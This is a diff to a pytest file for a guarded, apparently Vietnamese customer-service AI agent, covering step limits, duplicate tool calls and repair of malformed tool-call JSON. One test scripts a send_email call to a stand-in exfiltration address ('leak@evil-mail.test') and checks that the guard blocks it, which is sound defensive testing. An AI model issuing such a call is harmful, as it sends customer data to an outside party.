@@ -185,11 +185,49 @@ def test_final_answer_links_and_images_stripped(db):
     assert r.final_decision == Decision.SANITIZE
 
 
-def test_step_limit(db):
-    p = Scripted([call("search_docs", query="bảo hành")] * 7)
+def test_step_limit_then_forced_final(db):
+    queries = ["bảo hành", "đổi trả", "giao hàng", "khuyến mãi", "thanh toán", "lắp đặt"]
+    p = Scripted([call("search_docs", query=q) for q in queries] + [final("Tổng hợp xong.")])
     r = A.run_agent("lặp", CSKH, guarded=True, provider=p, db_path=db)
     assert len(r.steps) == A.MAX_STEPS
-    assert "giới hạn" in r.answer
+    assert r.answer == "Tổng hợp xong."
+    assert "Không gọi thêm công cụ" in p.requests[-1].prompt
+
+
+def test_duplicate_calls_are_not_reexecuted_and_force_final(db):
+    p = Scripted([call("order_status", order_id="DH-2026-01500")] * 3 + ["Đơn đang giao."])
+    r = A.run_agent("đơn?", CSKH, guarded=True, provider=p, db_path=db)
+    assert len(r.steps) == 1
+    assert r.answer == "Đơn đang giao."
+
+
+@pytest.mark.parametrize("raw,expected", [
+    ('```json {"tool": "order_status", "args": {"order_id": "DH-2026-01500"}}', "order_status"),
+    ('```json {"tool": "order_status", "args": {"order_id": "DH-2026-01500");}}```', "order_status"),
+    ('Tôi sẽ gọi: {"tool": "search_docs", "args": {"query": "bảo hành"}}', "search_docs"),
+])
+def test_malformed_tool_json_is_recovered(raw, expected):
+    assert A.parse_tool_call(raw)["tool"] == expected
+
+
+def test_malformed_final_is_not_shown_raw(db):
+    p = Scripted(['```json {"final": "Sofa bảo hành 24 tháng."'])
+    r = A.run_agent("bảo hành?", CSKH, guarded=True, provider=p, db_path=db)
+    assert r.answer == "Sofa bảo hành 24 tháng."
+
+
+def test_unparseable_json_gets_one_retry(db):
+    p = Scripted(['```json {"tool": ', final("Ok.")])
+    r = A.run_agent("x", CSKH, guarded=True, provider=p, db_path=db)
+    assert r.answer == "Ok."
+    assert "không hợp lệ" in p.context(1)
+
+
+def test_repaired_call_still_validated(db):
+    p = Scripted(['```json {"tool": "send_email", "args": {"to": "leak@evil-mail.test", "subject": "x", "body": "y");}}',
+                  final("x")])
+    r = A.run_agent("gửi", CSKH, guarded=True, provider=p, db_path=db)
+    assert r.steps[0].decision == "block" and not r.pending_actions
 
 
 def test_guarded_brief_hides_unpermitted_tools_and_schema(db):
